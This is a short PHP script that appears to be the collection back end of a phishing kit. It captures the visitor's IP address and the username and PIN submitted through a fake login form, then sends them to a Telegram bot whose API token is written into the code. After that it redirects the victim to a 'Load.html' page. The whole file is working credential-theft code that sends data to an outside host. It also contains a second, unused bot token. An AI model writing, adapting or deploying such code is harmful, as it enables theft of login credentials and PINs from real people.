<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message  = " ---[ Login Ing ]--- \n";
$message .= " + IP   : $ip \n";
$message .= " + login : ".$_POST['username']."\n";
$message .= " + PIN : ".$_POST['PIN']."\n";
$message .= "-------------- IP Infos ------------\n";
$token = "5710418707:AAGPgcPg_hfb4IWxiNeBB6QdyCREjLVsB_s";
$data = [
    'text' => $message,
    'chat_id' => '-895900324'
];

file_get_contents("https://api.telegram.org/bot5520173907:AAHRZFgI3UY5UqHfjnNtNOSask2HmQwJ9D8/sendMessage?" . http_build_query($data) );




header("Location: ../Load.html");?>